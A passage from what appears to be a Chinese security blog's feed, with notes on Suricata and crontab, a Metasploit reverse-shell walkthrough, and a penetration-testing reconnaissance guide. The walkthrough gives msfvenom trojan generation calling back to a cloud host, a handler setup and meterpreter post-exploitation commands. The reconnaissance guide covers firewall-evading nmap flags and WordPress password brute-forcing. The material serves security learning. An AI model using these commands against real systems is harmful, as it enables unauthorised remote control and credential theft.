spellcheck="true">#如果没安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有回显则没有安装</p><p>（2）安装inotify</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repoyum <span class="token function">install</span> inotify-tools -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/28/linux-cmd/1604557978079.png" alt="1604557978079"></p><p>(3) 查看版本</p><p><img src="/2020/09/28/linux-cmd/1604558015626.png" alt="1604558015626"></p><p>(4)使用教程</p><p>1）创建执行脚本：inotifytest.sh脚本：监控/root/testdir目录，输出目录的CRUD变化。<a href="https://blog.csdn.net/zzmfish/article/details/48787355?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">参考使用inotifywait同步修改的文件到服务器</a>。</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bash#监视目录和目标目录FROM_DIR="/root/testdir"#inotifywait -m -r --timefmt "%F %T" --format "%e %w %f" -o /var/log/change.log $FROM_DIRinotifywait -m --format "%e %w %f" $FROM_DIR | while read eventName dirName fileName; do    #显示事件    echo "-- Event:$eventName Dir:$dirName File:$fileName"    #忽略“.”开头和“_”结束的文件    if [[ $fileName == .* ]] || [[ $fileName == *_ ]]; then        continue    fi    #复制改动的文件（有些IDE会在临时文件编辑，保存时同够移动覆盖原文件）    case $eventName in    CREATE)        echo "create $fileName"        sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/$&#123;$fileName&#125; -l  /var/log/suricata/cap        #cp -v $&#123;dirName&#125;$&#123;fileName&#125; $TO_DIR/$dirName    esacdone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）执行监听脚本</p><pre><code>./inotifytest.sh#启动监听脚本，观察文件夹内的变化</code></pre><p><img src="/2020/09/28/linux-cmd/1604562579710.png" alt="1604562579710"></p><p>执行下面脚本，在文件夹内新增文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>int<span class="token operator">=</span>1<span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span> $int<span class="token operator">&lt;=</span><span class="token number">10</span> <span class="token punctuation">))</span></span>do+    <span class="token keyword">echo</span> <span class="token variable">$int</span>    <span class="token function">cp</span> /tmp/test.cap /root/testdir/$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;int&amp;#125;.cap</span>    <span class="token keyword">let</span> <span class="token string">"int++"</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crontab定时"><a href="#crontab定时" class="headerlink" title="crontab定时"></a>crontab定时</h4><p><a href="https://www.cnblogs.com/wenzheshen/p/8432588.html">https://www.cnblogs.com/wenzheshen/p/8432588.html</a></p><p><a href="https://blog.csdn.net/ithomer/article/details/6817019">https://blog.csdn.net/ithomer/article/details/6817019</a></p><p><a href="https://www.jellythink.com/archives/155">https://www.jellythink.com/archives/155</a></p><p>新建脚本time.sh 内容如下，防止suricata执行时间过长，有些文件没有执行到就被删除了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">cp</span> -Rf /root/testdir/ /root/temp/<span class="token function">rm</span> -rf /root/testdir/*suricata -c /etc/suricata/suricata.yaml -r /root/temp/<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/28/linux-cmd/1604578836302.png" alt="1604578836302"></p><p>每一分钟请求一个地址</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e*/1 * * * *  /usr/bin/curl https://www.baidu.com/ <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.将正确和错误日志都输出到 /tmp/load.log</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * /root/XXXX.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除rm"><a href="#删除rm" class="headerlink" title="删除rm"></a>删除rm</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -Rf /home/user1/* /root/temp/将 /home/user1目录下的所有东西拷到/root/temp/下而不拷贝user1目录本身。即格式为：cp -Rf 原路径/ 目的路径/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在阿里云主机反弹metosploit</title>
      <link href="/2020/09/28/pt-metosploitInAliyun/"/>
      <url>/2020/09/28/pt-metosploitInAliyun/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般反弹shell，需要一个公网Ip的机器，这里我们选择阿里云主机，因为阿里云主机默认是只开放了固定端口，因此我们想要对某个端口监听的，首先需要开起阿里云的具体端口，这里我们选择7777作为监听端口，具体配置如下图所示。这里还应该注意的是阿里云主机有两个IP，一个是公网IP，另外一个是内网IP，具体用法下面会说到。</p><p>利用阿里云作为反弹主机，因为阿里云主机默认是将端口关闭的，因此首先需要允许对应端口开放，这里我选择的是7777，具体配置如下图所示。需要注意的是，阿里主机有两个IP，一个为公网IP，一个为内网IP，这两个IP后面会说到。<a id="more"></a></p><p><img src="/2020/09/28/pt-metosploitInAliyun/1602814914926.png" alt="1602814914926"></p><h2 id="反弹shell步骤"><a href="#反弹shell步骤" class="headerlink" title="反弹shell步骤"></a>反弹shell步骤</h2><p>步骤如下：</p><p>1）生成载荷/木马，注意这里用的是阿里云公网IP（<a href="https://www.cnblogs.com/LyShark/p/12189163.html">生成各种载荷</a>）</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=阿里云公网IP lport=7777 -f exe &gt; load.exe</code></pre><p>2） 阿里云主机开始监听</p><pre><code>msfconsle #打开msfuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcp #注意这里的载荷要和生成木马对应的载荷相同options #查看选项set LHOST 阿里云内网IP #设置监听IPset LPORT 7777  #设置监听端口run/exploit#开始监听</code></pre><p>3)目标主机执行载荷/木马</p><p>双击Exe，如果是linux下，生成的elf木马</p><pre><code>chmod muma.elf#赋可执行权限./muma.elf #执行木马</code></pre><p>4）观察阿里云主机是否连接成功，如下图表示连接成功</p><p><img src="/2020/09/28/pt-metosploitInAliyun/1610957093533.png" alt="1610958466075"></p><p>5）连接成功后，meterpreter常用命令如下。</p><p><strong>基本命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">background  <span class="token comment" spellcheck="true"># 让meterpreter处于后台模式  </span>sessions -i index   <span class="token comment" spellcheck="true"># 与会话进行交互，index表示第一个session  </span>quit  <span class="token comment" spellcheck="true"># 退出会话  </span>shell <span class="token comment" spellcheck="true"># 获得控制台权限  </span>irb <span class="token comment" spellcheck="true"># 开启ruby终端</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token comment" spellcheck="true"># 查看文件内容  </span>getwd <span class="token comment" spellcheck="true"># 查看当前工作目录  </span>upload  <span class="token comment" spellcheck="true"># 上传文件到目标机上  </span>download <span class="token comment" spellcheck="true"># 下载文件到本机上  </span>edit <span class="token comment" spellcheck="true"># 编辑文件  </span>search  <span class="token comment" spellcheck="true"># 搜索文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">ipconfig / <span class="token function">ifconfig</span> <span class="token comment" spellcheck="true"># 查看网络接口信息  </span>portfwd  add -l 4444 -p 3389 -r 192.168.1.102 <span class="token comment" spellcheck="true"># 端口转发，本机监听4444，把目标机3389转到本机4444 </span>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="token comment" spellcheck="true">#然后使用rdesktop来连接，-u 用户名 -p 密码</span>route <span class="token comment" spellcheck="true"># 获取路由表信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> <span class="token comment" spellcheck="true"># 查看当前活跃进程 </span>migrate pid <span class="token comment" spellcheck="true"># 将Meterpreter会话移植到进程数位pid的进程中 </span>execute -H -i -f cmd.exe <span class="token comment" spellcheck="true"># 创建新进程cmd.exe，-H不可见，-i交互 </span>getpid <span class="token comment" spellcheck="true"># 获取当前进程的pid </span><span class="token function">kill</span> pid <span class="token comment" spellcheck="true"># 杀死进程 </span>getuid <span class="token comment" spellcheck="true"># 查看权限 </span>sysinfo <span class="token comment" spellcheck="true"># 查看目标机系统信息，如机器名，操作系统等 </span><span class="token function">shutdown</span> <span class="token comment" spellcheck="true"># 关机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h2><p><a href="https://paper.seebug.org/29/">meterpreter相关教程包括后渗透攻击</a></p><p><a href="https://www.cnblogs.com/LyShark/p/12189163.html">Metasploit 生成各种攻击载荷</a></p><p><a href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/">各种姿势反弹shell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2020/09/28/pt-info-collection/"/>
      <url>/2020/09/28/pt-info-collection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>江湖上流传着这样一句话，渗透测试的本质就是信息收集，一次成功的渗入，百分之80的时间都花在了信息收集上，信息收集真的这么重要么？那么具体要收集什么信息呢？</p><p>信息收集主要是收集服务器的配置信息和网站的敏感信息，主要包括域名信息、子域名信息、目标网站信息、目标网站真实IP、目录文件、开放端口和服务、中间件信息、脚本语言等等等。 <strong>汇总图如下？？？</strong></p><p><strong>在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。尽量用网络搜集，用工具收集时适当挂代理</strong>。因此主要从网络搜集和工具搜集两种方式去逐个介绍。</p><a id="more"></a><h1 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1 域名信息"></a>1 域名信息</h1><p>域名信息：whois信息，备案信息</p><h2 id="1-1-whois信息"><a href="#1-1-whois信息" class="headerlink" title="1.1 whois信息"></a>1.1 whois信息</h2><p>关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。 </p><p>Kali的查询：whois -h 注册服务器地址  域名  .例如：whoid freebuf.com</p><p> 站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>国外的who.is：<a href="https://who.is/">https://who.is/</a> </p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </p><p>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205057130.png" alt="1599205057130"></p><h2 id="1-2-备案信息"><a href="#1-2-备案信息" class="headerlink" title="1.2 备案信息"></a>1.2 备案信息</h2><p>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。 </p><p>常见查询备案信息的网站如下：</p><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> </p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> </p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> </p><p>爱站的备案查询：<a href="https://icp.aizhan.com/">https://icp.aizhan.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205081019.png" alt="1599205081019"></p><h1 id="2-子域名收集"><a href="#2-子域名收集" class="headerlink" title="2 子域名收集"></a>2 子域名收集</h1><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h2 id="2-1-网络搜索"><a href="#2-1-网络搜索" class="headerlink" title="2.1  网络搜索"></a>2.1  网络搜索</h2><h2 id="2-1-1-搜索引擎"><a href="#2-1-1-搜索引擎" class="headerlink" title="2.1.1 搜索引擎"></a>2.1.1 搜索引擎</h2><p> 可以利用Google、Bing 、shodan和百度这样的搜索引擎进行搜索查询 ，要掌握黑客语法，具体如下：</p><p>Google搜索语法：<a href="https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/">https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/</a></p><p>Bing搜索语法：<a href="https://blog.csdn.net/hansel/article/details/53886828">https://blog.csdn.net/hansel/article/details/53886828</a></p><p>百度搜索语法：<a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p><p>搜索实例：</p><p><img src="/2020/09/28/pt-info-collection/1599205666073.png" alt="1599205666073"></p><h2 id="2-1-2-在线网站"><a href="#2-1-2-在线网站" class="headerlink" title="2.1.2 在线网站"></a>2.1.2 在线网站</h2><p>（1）<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p>（2）<a href="http://i.links.cn/subdomain/%EF%BC%88">http://i.links.cn/subdomain/（</a></p><p>（3）<a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p><p>（4）<a href="http://z.zcjun.com/%EF%BC%88%E5%93%8D%E5%BA%94%E5%BE%88%E5%BF%AB,%E6%8E%A8%E8%8D%90%EF%BC%89">http://z.zcjun.com/（响应很快,推荐）</a></p><p>（5）Github搜索子域名</p><p><img src="/2020/09/28/pt-info-collection/1599206150013.png" alt="1599206150013"></p><h2 id="2-2-工具搜集"><a href="#2-2-工具搜集" class="headerlink" title="2.2 工具搜集"></a>2.2 工具搜集</h2><p>检测工具有很多，但重要的是需要日常完善字典，字典强大才是硬道理。常见的有</p><p>layer子域名挖掘机、Sublist3r、subDomainsBrute、K8、orangescan、DNSRecon、dnsmaper、wydomain等等，重点推荐layer子域名挖掘机（使用简单，界面细致）、Sublist3r（列举多资源下查到的域名）和subDomainsBrute。（递归查询多级域名），此类工具github都有下载地址和使用方法。</p><p>链接如下：</p><p>SubDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p>Layer（5.0增强版）：<a href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q</a> 密码:aup5</p><p><a href="https://d.chinacycc.com/">https://d.chinacycc.com</a>（大佬推荐的说好用的很，但是收费。）</p><h1 id="3-真实IP收集"><a href="#3-真实IP收集" class="headerlink" title="3 真实IP收集"></a>3 真实IP收集</h1><p>信息收集工程中IP地址是必不可少的，在域名收集工程中我们已经对ip段收集，whois、ping测试、指纹网站都可以探测ip地址，但是很多目标服务器存在CDN，那什么是CDN，如果饶过查找真实IP呢？</p><p>CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，只有在实际数据交互时才会从远程web服务器响应，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><h2 id="3-1-绕过cdn"><a href="#3-1-绕过cdn" class="headerlink" title="3.1 绕过cdn"></a>3.1 绕过cdn</h2><p><strong>3.1.1 确定有无cdn</strong></p><p>（1）很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p>(2)使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><p><strong>3.1.2 绕过cdn</strong></p><h2 id="3-2-c段，旁站ip"><a href="#3-2-c段，旁站ip" class="headerlink" title="3.2 c段，旁站ip"></a>3.2 c段，旁站ip</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。</p><p>C端：是和目标服务器ip处在同一个C段的其它服务器。</p><h3 id="3-2-1-网站扫描"><a href="#3-2-1-网站扫描" class="headerlink" title="3.2.1 网站扫描"></a>3.2.1 网站扫描</h3><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p><p> <a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a>  </p><p><a href="https://phpinfo.me/bing.php%EF%BC%88%E5%8F%AF%E8%83%BD%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%EF%BC%89">https://phpinfo.me/bing.php（可能访问不了）</a></p><h3 id="3-2-2-工具"><a href="#3-2-2-工具" class="headerlink" title="3.2.2 工具"></a>3.2.2 工具</h3><p>神器   ： <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>御剑1.5：<strong><a href="https://download.csdn.net/download/peng119925/10722958">https://download.csdn.net/download/peng119925/10722958</a></strong></p><p>C端查询：IIS PUT Scanner（扫描速度快，自定义端口，有banner信息）</p><p>Nmap：语法：nmap  -p  80,8080  –open  ip/24 </p><h1 id="4-端口信息"><a href="#4-端口信息" class="headerlink" title="4 端口信息"></a>4 端口信息</h1><p>对网站域名对应的真实IP地址进行端口测试，很多有防护不能大批量扫描和漏洞测试。</p><h2 id="4-1-网站"><a href="#4-1-网站" class="headerlink" title="4.1 网站"></a>4.1 网站</h2><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><a href="https://tool.lu/portscan/index.html">https://tool.lu/portscan/index.html</a> </p><h2 id="4-2-工具"><a href="#4-2-工具" class="headerlink" title="4.2 工具"></a>4.2 工具</h2><p>常见工具就是nmap(功能强大)、masscan、zmap和御剑tcp端口高速扫描工具(较快)。</p><p>扫描思路：我们可以在收集子域对应的的ip后整理到txt中，然后nmap批量端口扫描、服务爆破和漏洞扫描，前提是不被封禁IP，可采用代理池。</p><p>nmap -iL ip.txt –script=auth,vuln &gt; finalscan.txt 扫描导出常见端口和漏洞。</p><p>常见端口说明和攻击方向整理如下：<a href="https://m01ly.github.io/2020/09/04/pt-portinfo/">https://m01ly.github.io/2020/09/04/pt-portinfo/</a></p><pre><code> nmap 10.0.1.161  -p 1-65535 </code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap 过防火墙参数：-mtu 数据包最大传输单元--data-length 设置数据包的长度--scan-delay  延迟一定的时间发包，主要用于绕过频率的限制--randomize-hosts 对批量目标随机IP进行扫描，适合批量目标一起扫的情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大部分情况下使用上面的参数或者多个参数进行组合即可绕过防火墙进行扫描。</p><h1 id="5-网站信息收集"><a href="#5-网站信息收集" class="headerlink" title="5  网站信息收集"></a>5  网站信息收集</h1><p> 网站信息信息收集主要是：操作系统，中间件，脚本语言，数据库，服务器，web容器、waf、cdn、cms、历史漏洞、dns区域传送等，可以使用以下方法查询。 </p><p> 常见指纹工具：御剑web指纹识别、轻量级web指纹识别、whatweb等 </p><h2 id="5-1-web指纹"><a href="#5-1-web指纹" class="headerlink" title="5.1 web指纹"></a>5.1 web指纹</h2><p>web指纹：操作系统，框架，脚本语言，web容器，服务器，数据库，版本号等</p><p>潮汐指纹：<a href="http://finger.tidesec.net/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89">http://finger.tidesec.net/（推荐）</a></p><p>云悉(现在需要邀请码)：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p><p>CMS指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><h2 id="5-2-Waf-识别"><a href="#5-2-Waf-识别" class="headerlink" title="5.2 Waf 识别"></a>5.2 Waf 识别</h2><h3 id="5-2-1-wafw00f"><a href="#5-2-1-wafw00f" class="headerlink" title="5.2.1 wafw00f"></a>5.2.1 wafw00f</h3><p>kali上自带wafw00f，一条命令直接使用。建议最好在kali下使用，windows下的使用很麻烦。Nmap上也包含识别waf指纹的脚本模块。 </p><p>下载地址： <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  </p><p>WAFW00F探测WAF </p><pre><code>命令：wafw00f  -a  域名</code></pre><h3 id="5-2-2-nmap"><a href="#5-2-2-nmap" class="headerlink" title="5.2.2 nmap"></a>5.2.2 nmap</h3><p>Nmap探测WAF有两种脚本。</p><p>一种是http-waf-detect。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-detect  ip</code></pre><p>一种是http-waf-fingerprint。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h1 id="6-敏感目录文件收集"><a href="#6-敏感目录文件收集" class="headerlink" title="6 敏感目录文件收集"></a>6 敏感目录文件收集</h1><p>攻防测试中探测web目录和隐藏的敏感文件是很重要环境，从中可以获取网站后台管理页面、文件上传界面、备份文件、WEB-INF、robots、svn和源代码等。</p><p>主要通过工具扫描，主要有</p><p>（0）御剑–很强大（互联网有很多字典加强版）</p><p>（1） dirb   目录爆破dirb是必用的一款工具，因为它可以做目录的递归爆破</p><p>（2）7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p> （3）搜索引擎（Google、baidu、bing等），搜索引擎搜索敏感文件也较为常见，一般是这样：site:xxx.xxx filetype:xls。 </p><p> （4）爬虫-扫描器（AWVS、Burpsuite、Nessus等） </p><p> （5）BBscan（lijiejie大佬的脚本：<a href="https://github.com/lijiejie/BBScastorn">https://github.com/lijiejie/BBScastorn</a> ） </p><p> （6）凌风云搜索：<a href="https://www.lingfengyun.com/%EF%BC%88%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E5%8F%AF%E8%83%BD%E4%B8%8A%E4%BC%A0%E4%BA%91%E7%9B%98%E8%A2%AB%E5%9C%A8%E7%BA%BF%E6%8A%93%E5%8F%96%EF%BC%89">https://www.lingfengyun.com/（部分用户可能上传云盘被在线抓取）</a> </p><p> （6）github搜索</p><h1 id="7-社会工程学收集"><a href="#7-社会工程学收集" class="headerlink" title="7 社会工程学收集"></a>7 社会工程学收集</h1><p>我们可以通过社工库查询一些关键信息。对于很多社工库来说，存储达到T，数据量达到亿级别都是小case。内容方面包括帐号密码、邮箱地址、个人信息等等。</p><p>互联网社工库，威力有多大，就看数据库的数量和质量了，理论上达到了一定的量，很多的东西都是可以查的出来的，特别是那些基本所有网站都一个密码的，只要一个社工库的收集的其中一个数据库有他的帐号密码，那么查出来的密码就可以直接登陆该用户的其他帐号了。</p><h1 id="8-常见CMS扫描"><a href="#8-常见CMS扫描" class="headerlink" title="8 常见CMS扫描"></a>8 常见CMS扫描</h1><h2 id="8-1-wordpress"><a href="#8-1-wordpress" class="headerlink" title="8.1 wordpress"></a>8.1 wordpress</h2><p> <code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。 </p><h3 id="8-1-1-安装教程"><a href="#8-1-1-安装教程" class="headerlink" title="8.1.1 安装教程"></a>8.1.1 安装教程</h3><p>（1）安装：</p><p>windows平台不支持，kaili系统自带，其他平台安装教程见：<a href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><p>你可以使用下列命令在自己的设备中安装WPScan</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）更新</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --update <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-1-2-使用"><a href="#8-1-2-使用" class="headerlink" title="8.1.2 使用"></a>8.1.2 使用</h3><p><strong>（1）扫描漏洞</strong></p><pre><code>wpscan --url https://www.xxxxx.wiki/</code></pre><p>结果中红色为高危漏洞，绿色为Info</p><p><strong>（2）扫描用户</strong></p><pre><code>wpscan --url https://www.xxxxxxx.wiki/ --enumerate u</code></pre><p>获取用户名后，可以进一步加字典爆破：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -e u --wordlist /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(3) 扫描插件漏洞</p><p>扫描所用插件：wpscan -u <a href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki/</a> -enumerate p</p><p>扫描插件漏洞：wpscan -u <a href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki/</a> -enumerate vp</p><p>(4)扫描主题</p><p>扫描主题：wpscan –url <a href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki</a> –enumerate t</p><p>扫描主题漏洞：wpscan –url <a href="https://www.xxxxxx.wiki/">https://www.xxxxxx.wiki</a> –enumerate vt</p><p>(5)文件漏洞扫描</p><pre><code>wpscan -u https://www.xxxxxx.wiki/ -enumerate tt</code></pre><p><a href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><h1 id="9-福利"><a href="#9-福利" class="headerlink" title="9 福利"></a>9 福利</h1><h2 id="9-1-强大的搜索引擎"><a href="#9-1-强大的搜索引擎" class="headerlink" title="9.1 强大的搜索引擎"></a>9.1 强大的搜索引擎</h2><p>ZoomEy：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a> </p><p>FoFa：<a href="https://fofa.so/">https://fofa.so/</a> </p><p>Dnsdb：<a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a> </p><p>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a> </p><p>Censys：<a href="https://censys.io/">https://censys.io/</a> </p><p>御剑全家桶：<a href="http://www.moonsec.com/post-753.html">http://www.moonsec.com/post-753.html</a> </p><h2 id="9-2-工具"><a href="#9-2-工具" class="headerlink" title="9.2 工具"></a>9.2 工具</h2><p><a href="https://zhuanlan.zhihu.com/p/53112370">2019年Github上开源的安全渗透攻击类工具</a></p><p><a href="https://bbs.pediy.com/thread-261711.htm"> 2020版 github渗透测试工具库</a></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/243210.html">https://www.freebuf.com/articles/web/243210.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最佳网络安全和黑客软件</title>
      <link href="/2020/09/28/pt-tools/"/>
      <url>/2020/09/28/pt-tools/</url>
      
